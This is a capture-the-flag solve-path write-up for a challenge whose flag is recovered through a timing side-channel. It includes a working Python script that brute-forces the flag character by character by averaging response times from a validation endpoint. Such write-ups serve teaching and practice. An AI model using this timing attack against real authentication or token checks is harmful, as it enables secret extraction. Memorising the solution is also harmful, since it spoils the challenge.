Intended Solve Path
Step 1 — Initial Recon

Players test the input field.

Common failed attempts:

SQL injection

SSTI

command injection

unicode bypass

encoding tricks

None succeed.

This is intentional misdirection.

Step 2 — Notice Response Timing

Incorrect guesses return faster than partially correct guesses.

Example:

Guess: AAAAA
Time: 0.02s

Guess: DSCCTF{
Time: 0.22s


Observation:

Response time scales with correct prefix length.

Step 3 — Identify Timing Leak

Attackers deduce the backend compares characters sequentially.

Even with jitter present, averaging multiple requests reveals the signal.

Step 4 — Build an Attack Script

Typical approach:

Guess next character.

Send 5–15 requests.

Average response times.

Pick the slowest candidate.

Charset recommendation:

abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
0123456789{}_-

Step 5 — Extract Flag Character-by-Character

Pseudo strategy:

known = "DSCCTF{"

loop:
    test each possible char
    measure avg response
    append slowest


Expected solve time:

20–60 minutes depending on skill.

Example Solver Logic (Python Pseudocode)
import requests
import time
import statistics

URL = "http://target/validate"

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
known = "DSCCTF{"

def measure(payload):
    times = []

    for _ in range(8):
        start = time.perf_counter()
        requests.post(URL, json={"flag":payload})
        times.append(time.perf_counter() - start)

    return statistics.mean(times)


while not known.endswith("}"):
    scores = {}

    for c in charset:
        guess = known + c
        scores[c] = measure(guess)

    best = max(scores, key=scores.get)
    known += best

    print("Current:", known)
